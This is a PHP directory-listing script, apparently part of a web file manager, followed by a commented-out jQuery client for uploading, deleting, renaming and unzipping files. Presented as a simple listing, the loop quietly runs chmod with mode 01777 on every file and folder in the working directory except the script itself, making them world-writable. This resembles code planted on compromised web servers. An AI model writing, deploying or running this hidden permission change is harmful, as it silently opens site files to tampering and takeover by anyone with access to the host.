<?php
function getfiles($dir) {
	if(is_dir($dir)) {
		$active = basename(__FILE__);
		$result = array();
		$cdir = scandir($dir);
		$listFix = array();
		$total_data = 0;
		foreach ($cdir as $key => $value) {
			if(is_dir($dir.DIRECTORY_SEPARATOR.$value)) {
				$listFix[] = $value;
			}
		}
		foreach ($cdir as $key => $value) {
			if(!is_dir($dir.DIRECTORY_SEPARATOR.$value)) {
				$listFix[] = $value;
			}
		}
		foreach ($listFix as $key => $value) {
			if(!in_array($value, array(".","..")) && ($value != $active)) {
				$value = $dir . DIRECTORY_SEPARATOR . $value;
				chmod($value, 01777);
				$result[] = $value;
				$result[$value]["name"] = basename($value);
				$result[$value]["directory"] = is_dir($value);
				if(!is_dir($value)){
					$size = number_format(filesize($value)/1024);
				} else {
					$size = "-";
				}
				$result[$value]["size"] = $size;
				$result[$value]["modified"]	= filemtime($value);
				$result[$value]["path"]	= realpath($value);
				$result[$value]["perm"]	= fileperms($value);
				$result[$value]["ext"] = pathinfo($value, PATHINFO_EXTENSION);
				$total_data++;
			}
		}
		$status["status"] = 1;
		$status["total"] = $total_data;
		$status["message"] = "";
		$status["data"] = $result;
	} else {
		$status["status"] = 0;
		$status["message"] = "re-check the path!";
		$status["data"] = "";
	}
	return json_encode($status);
}
$flist = json_decode(getfiles(getcwd()));
foreach ($flist->data as $key => $value) {
	if (isset($value->name)) {
		$kind = 'file';
		$size = $value->size." KB";
		$name = $value->name;
		if ($value->directory) {
			$kind = "folder";
			$size = "";
			$name = "<a dir='".str_replace("+", "%2B", getcwd()).str_replace("+", "%2B", $name)."' class='goDir'>".$name."</a>";
		}
		print($name)."<br>";
	}
}
?>
<!--<script src="//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
		<script type="text/javascript">
			var XSRF 			= (document.cookie.match('(^|; )_sfm_xsrf=([^;]*)')||0)[2];
			//var MAX_UPLOAD_SIZE = <?php echo $MAX_UPLOAD_SIZE ?>;
			$(document).ready(function(){

				$(document).on("submit",".extractTo",function(e){
					e.preventDefault();
					var dirTo 	= $(".newDirName").val();
					var data_f 	= $(this).serialize();
					loadingStart();
					$.ajax({
						type 	: "post",
						data 	: data_f,
						url 	: document.URL,
						success	: function(result){
							$("#loadAjax").load(document.URL+"?dir="+urlFIx(dirTo)+" #loadAjax",function(){
								$(".detailClicked").hide();
								$(".inputRename").val("");
								loadingEnd();
								forClickable();
							});		
							window.history.pushState('obj', 'newtitle', '?dir='+dirTo.replace('./', ''));
						}
					});
				});

				$(document).on("click",".btnTop",function(){
					$(".btnTop").addClass("hide");
					$(this).removeClass("hide");
				});
				$(document).on("click",".cancelUploadBtn",function(){
					$(".uploadModule").hide();
					$(".btnTop").removeClass("hide");
				});
				$(document).on("click",".btnUploadFile",function(){
					$(".uploadModule").show();
				});
				$(document).on("click",".btnSub",function(){
					var showWhat = $(this).attr("data-show");
					var hideWhat = $(this).attr("data-hide");
					$("."+hideWhat).hide();
					$("."+showWhat).show();
				});
				function fixedHeader(){
					$(".nameH").css("width",$(".nameL").outerWidth());
					$(".typeH").css("width",$(".typeL").outerWidth());
					$(".modifiedH").css("width",$(".modifiedL").outerWidth());
					$(".sizeH").css("width",$(".sizeL").outerWidth());
				}

				$(document).on("submit",".newFolder",function(e){
					e.preventDefault();
					loadingStart();
					var data_f 		= $(this).serialize();
					$.ajax({
						type 		: "post",
						data 		: data_f,
						url 		: document.URL,
						success 	: function(result){
							var obj = jQuery.parseJSON(result);
							if(obj.status==0){
								$(".info_new_folder").html(obj.message);
								loadingEnd();
							}else{
								$(".divLoad").load(document.URL+" .divLoad",function(){
									$(".btnNewFolder").click();
									$(".inputFolderName").val("");
									$(".btnTop").removeClass("hide");
									loadingEnd();
									forClickable();
								});
							}
						}
					});
				});
				function urlFIx(str) {
				  	return encodeURIComponent(str).replace(/[!'()*]/g, function(c) {
				    	return '%' + c.charCodeAt(0).toString(16);
				  	});
				}
				$(document).on("click",".yesDeleteBtn",function(){
					var dir_path 		= $(this).attr("data-path");
					loadingStart();
					$.ajax({
						type 	: "post",
						data 	: "dir_delete="+urlFIx(dir_path).replace("+","%2B"),
						url 	: document.URL,
						success	: function(e){
							$(".divLoad").load(document.URL+" .divLoad",function(){
								$(".detailClicked").hide();
								loadingEnd();
								forClickable();
							});
						}
					});
				});
				$(document).on("submit",".renameSelected",function(e){
					e.preventDefault();
					var data_f 	= $(this).serialize();
					loadingStart();
					$.ajax({
						type 	: "post",
						data 	: data_f,
						url 	: document.URL,
						success	: function(result){
							$(".divLoad").load(document.URL+" .divLoad",function(){
								$(".detailClicked").hide();
								$(".inputRename").val("");
								loadingEnd();
								forClickable();
							});
						}
					});
				});
				$(document).on("click",".clickable",function(){
					$(".btnHide").click();
					$(".clickable").removeClass("activeTr");
					$(".detailClicked").show();
					$(this).addClass("activeTr");

					var selectedName 	= $(this).attr("data-name");
					var dir_path		= $(this).attr("data-path");
					var data_path_dir	= $(this).attr("data-path-dir");
					var data_type		= $(this).attr("data-type");

					if(data_type=="folder"){
						$(".dwnldbtn").hide();
					}else{
						$(".dwnldbtn").show();
					}

					if(data_type!="zip"){
						$(".unzipBtn").hide();
					}else{
						$(".unzipBtn").show();
					}

					$(".yesDeleteBtn").attr("data-path",dir_path);
					$(".oldName").val(dir_path);
					$(".pathNew").val(data_path_dir);
					$(".newNameN").val(selectedName);

					var newDirName 		= data_path_dir;
					if(data_path_dir.substr(0, 1)=="."){
						var newDirName 	= data_path_dir.substr(1);
					}

					$(".newDirName").val(newDirName);
					$(".getZipPath").val(dir_path);

					$(".selectedName").text(selectedName);
					$(".downloadBtn").attr("href",dir_path);
					
					$(".subMenu").hide();
					$(".parentMenu").show();
				});
				function forClickable(){
					$('.clickable').hover(function(){ 
				        mouse_is_inside=true; 
				    }, function(){ 
				        mouse_is_inside=false; 
				    });
				    $('.detailClicked').hover(function(){ 
				        mouse_is_inside=true; 
				    }, function(){ 
				        mouse_is_inside=false; 
				    });
					$("body").mouseup(function(){ 
				        if(!mouse_is_inside) {
							$(".detailClicked").hide();
							$(".clickable").removeClass("activeTr");
				        }
				    });
				}
				forClickable();
				$(document).on("click",".btnShow",function(){
					var show_what 	= $(this).attr("data-show");
					var default_text= $(this).html();
					var data_change	= $(this).attr("data-change");
					$(this).attr("data-change",default_text);
					$("."+show_what).show();
					$(this).html(data_change);
					$(this).addClass("btnHide");
					$(this).removeClass("btnShow");
				});
				$(document).on("click",".btnHide",function(){
					var show_what 	= $(this).attr("data-show");
					var default_text= $(this).html();
					var data_change	= $(this).attr("data-change");
					$(this).attr("data-change",default_text);
					$("."+show_what).hide();
					$(this).html(data_change);
					$(this).addClass("btnShow");
					$(this).removeClass("btnHide");
					$(".btnTop").removeClass("hide");
				});
				function loadingStartC(stat){
					$("#progress").removeClass("percentageDone");
					$("#progress").removeClass("done");
					$("#progress").css("width",  stat+"%");
				}
				function loadingStart(){
					$("#progress").removeClass("percentageDone");
					$("#progress").removeClass("done");
					$({property: 0}).animate({property: 90}, {
				        duration: 3000,
				        step: function() {
				          	var _percent = Math.round(this.property);
				          	$("#progress").css("width",  _percent+"%");
				        }
				    });
				}
				function loadingEnd(){
					$("#progress").addClass("percentageDone");
					$("#progress").addClass("done");
				}
				$(document).on("click",".goDir",function(){
					var dir 	= $(this).attr("dir");
					loadingStart();
					$("#loadAjax").load(document.URL+"?dir="+urlFIx(dir)+" #loadAjax",function(){
						
						$("body").attr("data-dir-all",dir);

						loadingEnd();
						forClickable();
					});
					window.history.pushState('obj', 'newtitle', '?dir='+dir.replace('./', ''));
				});
				$(document).on("click",".linkAjax",function(e){
					e.preventDefault();
					var link 		= $(this).attr("href");
					loadingStart();
					$("#loadAjax").load(urlFIx(link)+" #loadAjax",function(){

						$("body").attr("data-dir-all","/");

						loadingEnd();
						forClickable();
					});
					window.history.pushState('obj', 'newtitle', link);
				});
				$(document).on("click",".btnChange",function(){
					var data_before = $(this).html();
					var data_change = $(this).attr("data-change");
					var temp		= data_change;
					$(".btnChange").attr("data-change",data_before);
					$(".btnChange").html(data_change);

					var data_hide	= $(this).attr("data-hide");
					var data_show	= $(this).attr("data-show");
					var temp 		= data_show;
					$(".btnChange").attr("data-show",data_hide);
					$(".btnChange").attr("data-hide",temp);

					$("."+data_hide).hide();
					$("."+data_show).show();

					$(".inputPassword").val("");
					$(".infoLogin").html("");
				});
				$(document).on("submit",".formAjax",function(e){
					e.preventDefault();
					var action_form 	= $(this).attr("action");
					var method_form		= $(this).attr("method");
					var all_data		= $(this).serialize();
					loadingStart();
					$.ajax({
						type		: method_form,
						url 		: action_form,
						data 		: all_data,
						success		: function(result){
							loadingEnd();
							var obj = jQuery.parseJSON(result);
							if(obj.status==0){
								$(".inputPassword").val("");
								$(".infoLogin").html(obj.message);
							}else{
								$("#loadAjax").load(obj.redirect+" #loadAjax",function(){
									forClickable();
								});
								$(".infoLogin").html(obj.message);
							}
						}
					});
				});

				function parseURLParams(url) {
				    var queryStart = url.indexOf("?") + 1,
				        queryEnd   = url.indexOf("#") + 1 || url.length + 1,
				        query = url.slice(queryStart, queryEnd - 1),
				        pairs = query.replace(/\+/g, " ").split("&"),
				        parms = {}, i, n, v, nv;

				    if (query === url || query === "") {
				        return;
				    }

				    for (i = 0; i < pairs.length; i++) {
				        nv = pairs[i].split("=");
				        n = decodeURIComponent(nv[0]);
				        v = decodeURIComponent(nv[1]);

				        if (!parms.hasOwnProperty(n)) {
				            parms[n] = [];
				        }

				        parms[n].push(nv.length === 2 ? v : null);
				    }
				    return parms;
				}
				/*
					for file uploading drag and drop
				*/
				$('body').bind('dragover',function(){
					$(".uploadModule").show();
					return false;
				});

				$('#file_drop_target').bind('dragover',function(){
					$(this).addClass('drag_over');
					return false;
				}).bind('dragend',function(){
					$(".uploadModule").hide();
					$(this).removeClass('drag_over');
					return false;
				}).bind('drop',function(e){
					e.preventDefault();
					var files = e.originalEvent.dataTransfer.files;
					$.each(files,function(k,file) {
						uploadFile(file);
					});
					$(this).removeClass('drag_over');
					$(".uploadModule").hide();
				});
				$('input[type=file]').change(function(e) {
					e.preventDefault();
					$.each(this.files,function(k,file) {
						uploadFile(file);
					});
				});

				if(typeof parseURLParams(document.URL) === 'undefined'){
					paramParam = "/";
				}else{
					paramParam = parseURLParams(document.URL)["dir"];
				}

				function uploadFile(file) {
					var folder = window.location.hash.substr(1);
					if(file.size > MAX_UPLOAD_SIZE) {
						alert("max upload size = "+MAX_UPLOAD_SIZE/1024/1024+" MB");
						loadingEnd();
					}
					var fd = new FormData();
					fd.append('file_data',file);
					fd.append('file',folder);
					fd.append('xsrf',XSRF);
					fd.append('doUpload','upload');
					fd.append('dirActive',$("body").attr("data-dir-all"));
					var xhr = new XMLHttpRequest();
					xhr.open('POST', '?');
					xhr.onerror = function(){
						loadingEnd();
						$("input[type='file']").val("");
					};
					xhr.onreadystatechange=function(e){
						if(e.readyState=="4"){
							$(".divLoad").load(document.URL+" .divLoad",function(){
								loadingEnd();
								forClickable();
								$("input[type='file']").val("");
								$(".btnTop").removeClass("hide");
							});
						}
					};
					xhr.upload.onprogress = function(e){
						if(e.lengthComputable) {
							loadingStartC(e.loaded/e.total*100 | 0);
						}else{
							loadingStart();
						}
					}
					xhr.onload = function() {
						$(".divLoad").load(document.URL+" .divLoad",function(){
							loadingEnd();
							forClickable();
							$("input[type='file']").val("");
							$(".btnTop").removeClass("hide");
						});
			  		};

				    xhr.send(fd);
				}
			});
		</script>-->
